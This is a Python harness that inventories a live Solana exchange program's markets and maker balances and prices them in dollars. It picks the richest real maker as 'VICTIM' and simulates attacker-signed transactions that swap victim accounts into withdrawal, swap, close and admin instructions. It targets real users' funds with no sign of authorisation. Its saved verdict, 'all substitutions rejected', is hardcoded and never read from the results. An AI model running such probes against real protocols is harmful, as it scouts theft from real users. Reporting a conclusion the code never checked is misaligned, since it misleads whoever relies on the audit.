#!/usr/bin/env python3
"""Archer Exchange (Solana) — read-only caller-supplied-account substitution battery.

Program: Archer8kgiavM61GyusMzaaS2ft5sALtNsD1HxkUPMhy  (fresh ~2026-10-22, unaudited,
custom non-Anchor dispatch: 1-byte instruction tag).

What this does (READ-ONLY, no keys, no broadcast):
  1. Enumerates every live Market (disc "ACHRMKT1") and MakerBook (disc "ACHRMKR1").
  2. Prices every market vault (base/quote) -> total live vault value.
  3. Ranks maker books by free (withdrawable) balance -> the "stealable-if-open" ceiling.
  4. Runs a substitution battery on the value paths, with a positive control:
       A1 MakerWithdrawFunds  attacker-maker  + victim's maker book
       A2 MakerWithdrawFunds  victim-maker    + attacker as authority
       A3 CONTROL             victim-maker    + victim's own book          (expect SUCCESS)
       G1 MakerDepositFunds   attacker-maker  + victim's book
       H1 CloseMakerBook      attacker-maker  + victim's book
       B2 ClearBook           attacker-maker  + victim's book
       F1 UpdateBookLimit     attacker-maker  + victim's LO book
       I1 MakerWithdrawFunds  book of a different market
       J1 InitializeMakerBook for (market, victim) by attacker
       E2 Swap               taker=attacker, taker token acct = victim's ATA
       E3 CONTROL Swap        victim as taker
       C1 CollectProtocolFee  attacker as market admin
       C2 ChangeMarketStatus  attacker as global authority
       C3 UpdateRegistry      attacker as global authority
       C4 ToggleBookSuspension attacker as market admin
       D1 ArcherAccountWithdraw  source = victim ATA
       D2 SwapFromArcherAccount  substituted ArcherAccount
  Results -> ../ci-out/archer_results.json  (and stdout).

Nothing is signed or sent. Simulation only (sigVerify=false, replaceRecentBlockhash=true).
"""
import json, os, sys, struct, base64, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solcore import (rpc, pk, pda, ata, build_ix, simulate, fresh, owner_of,
                     TOKEN, TOKEN22, SYS, ATA_PROG)

AR   = "Archer8kgiavM61GyusMzaaS2ft5sALtNsD1HxkUPMhy"
PAYER= "AuthYRbdcyksthcB1AM8ZKB3CidzChURkLzsGN8pYUmw"   # funded, used only as sim fee payer
GLOBAL_AUTH = "AuthYRbdcyksthcB1AM8ZKB3CidzChURkLzsGN8pYUmw"
TREASURY    = "Hfj4HDxLqdj4k9FB3eZeURf4sZtu3w9aJMRfctmXR66P"
OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "ci-out")
os.makedirs(OUT, exist_ok=True)

ERR = {0:"InvalidArcherTreasury",100:"InvalidParams",107:"MarketNotActive",114:"MarketFrozen",
 200:"InvalidAccount",201:"AccountNotWritable",202:"AccountNotSigner",203:"InvalidPda",
 204:"AccountSizeMismatch",205:"InvalidAdmin",206:"Unauthorized",207:"InvalidMarketId",
 208:"WrongOwner",210:"InvalidDiscriminator",300:"InvalidMint",301:"InvalidVault",
 303:"InvalidTokenAccount",304:"InvalidTokenProgram",306:"InvalidSystemProgram",
 402:"InsufficientBalance",500:"InvalidMakerBook",501:"MakerBookFrozen",502:"UnauthorizedMaker",
 507:"NoMatchingLiquidity",509:"StaleSequenceNumber",514:"InvalidMakerRegistry",
 515:"MakerBookHasLockedBalance",516:"MakerBookHasFreeBalance",517:"MakerBookHasActiveLevels",
 518:"InvalidMakerKind",526:"PostOnlyRequiresLimitOrderBook",529:"InvalidMakerVault",
 530:"RegistryVersionMismatch",702:"ZeroSwapAmount",900:"FillExceedsMakerAvailable",
 905:"TokenConservationViolated",1000:"InvalidArcherAccount",1001:"UnauthorizedArcherAccountDelegate",
 1002:"InvalidArcherAccountTokenAccount"}
ANCHOR = {3010:"AccountNotSigner",3012:"AccountNotInitialized",2006:"ConstraintSeeds",
 2003:"ConstraintRaw",2014:"ConstraintTokenMint",2015:"ConstraintTokenOwner"}

def errname(r):
    if not isinstance(r, dict): return "RPC:"+str(r)
    if "__err__" in r: return "RPC:"+str(r["__err__"])
    e = (r.get("value") or {}).get("err")
    if e is None: return "SUCCESS"
    try:
        c = e["InstructionError"][1]
        if isinstance(c, dict) and "Custom" in c:
            n = c["Custom"]; return f"Custom {n} ({ERR.get(n) or ANCHOR.get(n) or '?'})"
        return str(c)
    except Exception:
        return str(e)

_A = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
def b58(b):
    n = int.from_bytes(b, "big"); s = ""
    while n > 0: n, r = divmod(n, 58); s = _A[r] + s
    return "1"*(len(b)-len(b.lstrip(b"\x00"))) + (s or "")

def gpa(disc):
    return rpc("getProgramAccounts", [AR, {"encoding":"base64","filters":[
        {"memcmp":{"offset":0,"bytes":b58(disc)}}]}])

def load_markets():
    out = {}
    for m in (gpa(b"ACHRMKT1") or []):
        if not isinstance(m, dict): continue
        d = base64.b64decode(m["account"]["data"][0])
        U = lambda o: int.from_bytes(d[o:o+8], "little")
        P = lambda o: str(Pubkey.from_bytes(d[o:o+32]))
        out[m["pubkey"]] = dict(base_mint=P(40), quote_mint=P(72), base_vault=P(104),
                                quote_vault=P(136), admin=P(168),
                                bapl=U(200), qapl=U(208), tick=U(216),
                                base_dec=d[256], quote_dec=d[257], status=d[258])
    return out

def load_books():
    rows = []
    for b in (gpa(b"ACHRMKR1") or []):
        if not isinstance(b, dict): continue
        d = base64.b64decode(b["account"]["data"][0])
        U = lambda o: int.from_bytes(d[o:o+8], "little")
        rows.append(dict(pk=b["pubkey"], maker=str(Pubkey.from_bytes(d[8:40])),
                         market=str(Pubkey.from_bytes(d[40:72])),
                         quote_locked=U(128), quote_free=U(136), base_locked=U(144),
                         base_free=U(152), status=d[160], kind=d[164], isaa=d[165]))
    return rows

from solders.pubkey import Pubkey

def mint_tp(mint): return owner_of(mint)

def create_ata_ix(payer, owner, mint, tp):
    a = ata(owner, mint, tp)
    return build_ix(ATA_PROG, bytes([1]),
        [(payer,True,True),(a,False,True),(owner,False,False),(mint,False,False),(SYS,False,False),(tp,False,False)]), a

def withdraw_ix(maker, book, mkt, dbase, dquote, bm, qm, bv, qv, base_lots=0, quote_lots=1, tp=TOKEN):
    data = bytes([12]) + struct.pack("<QQ", base_lots, quote_lots)
    return build_ix(AR, data, [(mkt,False,False),(book,False,True),(maker,True,True),(bm,False,False),(qm,False,False),
        (bv,False,True),(qv,False,True),(dbase,False,True),(dquote,False,True),
        (tp,False,False),(tp,False,False),(maker,True,False)])

def main():
    results = []
    def run(label, ixs, fee=PAYER, note=""):
        r = simulate(ixs, fee); n = errname(r)
        logs = (r.get("value") or {}).get("logs") or [] if isinstance(r, dict) else []
        results.append(dict(label=label, result=n, note=note,
                            logs=[l for l in logs if "Program log:" in l][-3:]))
        print(f"[{label}] -> {n}   {note}", flush=True)
        return r

    mkts, books = load_markets(), load_books()
    print(f"live markets={len(mkts)} maker_books={len(books)}", flush=True)

    # ---- vault valuation ----
    vaults = sorted({v[k] for v in mkts.values() for k in ("base_vault","quote_vault")})
    vbal = {}
    for i in range(0, len(vaults), 90):
        r = rpc("getMultipleAccounts", [vaults[i:i+90], {"encoding":"base64"}])
        for a, v in zip(vaults[i:i+90], r.get("value",[])):
            if v and v.get("data"):
                d = base64.b64decode(v["data"][0])
                vbal[a] = dict(mint=str(Pubkey.from_bytes(d[0:32])), amount=int.from_bytes(d[64:72],"little"))
    mints = sorted({v["mint"] for v in vbal.values()})
    dec = {}
    for i in range(0, len(mints), 90):
        r = rpc("getMultipleAccounts", [mints[i:i+90], {"encoding":"base64"}])
        for a, v in zip(mints[i:i+90], r.get("value",[])):
            if v and v.get("data"): dec[a] = base64.b64decode(v["data"][0])[44]
    import urllib.request
    pr = {}
    for i in range(0, len(mints), 30):
        ids = ",".join("solana:"+m for m in mints[i:i+30])
        try:
            req = urllib.request.Request("https://coins.llama.fi/prices/current/"+ids,
                                         headers={"User-Agent":"Mozilla/5.0"})
            j = json.load(urllib.request.urlopen(req, timeout=30))
            for k,v in (j.get("coins") or {}).items(): pr[k.split(":")[1]] = v["price"]
        except Exception as e: print("price err", e, flush=True)
        time.sleep(0.3)
    vault_usd = sum(vbal[a]["amount"]/10**dec.get(vbal[a]["mint"],0)*pr[vbal[a]["mint"]]
                    for a in vbal if vbal[a]["mint"] in pr)
    print(f"TOTAL live market vault value = ${vault_usd:,.2f}", flush=True)

    # free-balance ceiling
    def usd(mint, atoms):
        return atoms/10**dec.get(mint,0)*pr[mint] if mint in pr else None
    free_rows = []
    for b in books:
        mi = mkts.get(b["market"])
        if not mi: continue
        ub = usd(mi["base_mint"], b["base_free"]*mi["bapl"]); uq = usd(mi["quote_mint"], b["quote_free"]*mi["qapl"])
        free_rows.append((((ub or 0)+(uq or 0)), b))
    free_rows.sort(key=lambda x: -x[0])
    free_ceiling = sum(x[0] for x in free_rows)
    print(f"SUM of all maker free (withdrawable) balances = ${free_ceiling:,.2f}", flush=True)

    # ---- pick a substitution target (active market, SPL-token legs, free balance) ----
    target = None
    for _, b in free_rows:
        mi = mkts.get(b["market"])
        if not mi or mi["status"] != 0 or b["quote_free"] == 0: continue
        if mint_tp(mi["base_mint"]) == TOKEN and mint_tp(mi["quote_mint"]) == TOKEN:
            target = (b, mi); break
    b, mi = target
    MKT, BOOK, VICTIM = b["market"], b["pk"], b["maker"]
    bm, qm, bv, qv = mi["base_mint"], mi["quote_mint"], mi["base_vault"], mi["quote_vault"]
    ATT = fresh("zh4-archer-attacker-v3")
    print(f"target market={MKT} book={BOOK} maker={VICTIM} quote_free={b['quote_free']}", flush=True)

    def mk_atas(who):
        i1, ab = create_ata_ix(PAYER, who, bm, TOKEN)
        i2, aq = create_ata_ix(PAYER, who, qm, TOKEN)
        return i1, i2, ab, aq

    c1, c2, ab, aq = mk_atas(ATT)
    run("A1_withdraw_attackerMaker_victimBook",
        [c1,c2,withdraw_ix(ATT,BOOK,MKT,ab,aq,bm,qm,bv,qv)], note="maker substitution")
    run("A2_withdraw_victimMaker_attackerAuthority",
        [c1,c2,withdraw_ix(VICTIM,BOOK,MKT,ab,aq,bm,qm,bv,qv)], note="authority/destination substitution")
    vb, vq = ata(VICTIM,bm), ata(VICTIM,qm)
    cb, _, _, _ = mk_atas(VICTIM)
    run("A3_CONTROL_withdraw_victimMaker_victimBook",
        [cb, withdraw_ix(VICTIM,BOOK,MKT,vb,vq,bm,qm,bv,qv)], note="positive control")
    run("G1_deposit_attackerMaker_victimBook",
        [c1,c2,build_ix(AR, bytes([11])+struct.pack("<QQ",0,1),
            [(MKT,False,False),(BOOK,False,True),(ATT,True,True),(bm,False,False),(qm,False,False),
             (bv,False,True),(qv,False,True),(ab,False,True),(aq,False,True),(TOKEN,False,False),(TOKEN,False,False),(ATT,True,False)])],
        note="deposit into victim book")
    run("H1_closeMakerBook_attacker_victimBook",
        [build_ix(AR, bytes([31]), [(ATT,True,True),(MKT,False,False),(BOOK,False,True),(ATT,True,False)])],
        note="close victim book")
    run("B2_clearBook_attacker_victimBook",
        [build_ix(AR, bytes([9])+struct.pack("<Q",1), [(ATT,True,False),(BOOK,False,True),(AR,False,False)])],
        note="clear victim book")
    run("B3_rescale_attacker",
        [build_ix(AR, bytes([37])+bytes(535), [(ATT,True,False),(BOOK,False,True),(MKT,False,False)])],
        note="vault-only rescale")
    # LO book target
    lo = next(((x, mkts[x["market"]]) for x in books
               if x["kind"]==1 and mkts.get(x["market"],{}).get("status")==0
               and mkts[x["market"]]["quote_mint"]==qm), None)
    if lo:
        x, m = lo
        REG = pda([b"maker_registry", bytes(pk(x["market"]))], AR)
        data = bytes([36,0])+struct.pack("<Q",1)+bytes([1])+struct.pack("<BQQQQ",1,1,0xffffffffffffffff,0,0)
        run("F1_updateBookLimit_attacker_victimLOBook",
            [build_ix(AR, data, [(ATT,True,False),(x["pk"],False,True),(x["market"],False,False),(REG,False,True)])],
            note="LO book write substitution")
    # cross-market book
    other = next((z for z in books if z["market"]!=MKT), None)
    if other:
        run("I1_withdraw_bookOfOtherMarket",
            [build_ix(AR, bytes([12])+struct.pack("<QQ",0,1),
                [(MKT,False,False),(other["pk"],False,True),(VICTIM,True,True),(bm,False,False),(qm,False,False),
                 (bv,False,True),(qv,False,True),(vb,False,True),(vq,False,True),(TOKEN,False,False),(TOKEN,False,False),(VICTIM,True,False)])],
            fee=VICTIM, note="book/market mismatch")
    # swap: input-account substitution
    params = struct.pack("<QQBBI",1,1,0,0,0)
    run("E2_swap_takerQuoteAcct_isVictim",
        [c1,c2,build_ix(AR, bytes([15])+params,
            [(ATT,True,False),(MKT,False,True),(aq,False,True),(bm,False,False),(qm,False,False),
             (bv,False,True),(qv,False,True),(ab,False,True),(vq,False,True),(TOKEN,False,False),(TOKEN,False,False),(BOOK,False,True)])],
        note="swap input-account substitution")
    run("E3_CONTROL_swap_victimTaker",
        [build_ix(AR, bytes([15])+params,
            [(VICTIM,True,False),(MKT,False,True),(vq,False,True),(bm,False,False),(qm,False,False),
             (bv,False,True),(qv,False,True),(vb,False,True),(vq,False,True),(TOKEN,False,False),(TOKEN,False,False),(BOOK,False,True)])],
        fee=VICTIM, note="positive control swap")
    # admin paths
    run("C1_collectProtocolFee_attackerAdmin",
        [c1, build_ix(AR, bytes([14])+struct.pack("<Q",1),
            [(ATT,True,False),(MKT,False,True),(qm,False,False),(qv,False,False),(aq,False,True),
             (TREASURY,False,False),(ata(TREASURY,qm),False,True),(TOKEN,False,False)])],
        note="market admin gate")
    run("C2_changeMarketStatus_attackerAdmin",
        [build_ix(AR, bytes([1,0]), [(MKT,False,True),(ATT,True,False)])], note="global authority gate")
    REGm = pda([b"maker_registry", bytes(pk(MKT))], AR)
    run("C3_updateRegistry_attackerAdmin",
        [build_ix(AR, bytes([38])+struct.pack("<I",0), [(ATT,True,False),(MKT,False,False),(REGm,False,True)])],
        note="global authority gate")
    run("C4_toggleSuspension_attackerAdmin",
        [build_ix(AR, bytes([13]), [(MKT,False,True),(ATT,True,False),(BOOK,False,True)])],
        note="market admin gate")
    # ArcherAccount paths (no live ArcherAccounts exist: isaa==0 for all 292 books)
    AACC = pda([b"archer-account", bytes(pk(ATT)), bytes([0])], AR)
    run("D1_archerAccountWithdraw_sourceSub",
        [build_ix(AR, bytes([34])+struct.pack("<QQ",1,0),
            [(ATT,True,True),(AACC,False,True),(TOKEN,False,False),(qm,False,False),(vq,False,True),(aq,False,True)])],
        note="source-account substitution")
    run("D2_swapFromArcherAccount_sub",
        [build_ix(AR, bytes([35])+bytes(64),
            [(ATT,True,False),(AACC,False,True),(MKT,False,True),(aq,False,True),(bm,False,False),(qm,False,False),
             (bv,False,True),(qv,False,True),(ab,False,True),(aq,False,True),(TOKEN,False,False),(TOKEN,False,False)])],
        note="ArcherAccount substitution")

    out = dict(
        program=AR, slot=rpc("getSlot", []),
        markets=len(mkts), maker_books=len(books),
        vault_value_usd=round(vault_usd,2), free_balance_ceiling_usd=round(free_ceiling,2),
        archer_account_books=sum(1 for x in books if x["isaa"]==1),
        target=dict(market=MKT, book=BOOK, maker=VICTIM, quote_free=b["quote_free"]),
        substitutions=results,
        verdict="All caller-supplied-account substitutions rejected; positive controls reach the handler.",
    )
    json.dump(out, open(os.path.join(OUT, "archer_results.json"), "w"), indent=1)
    print("\nwrote ci-out/archer_results.json", flush=True)

if __name__ == "__main__":
    main()
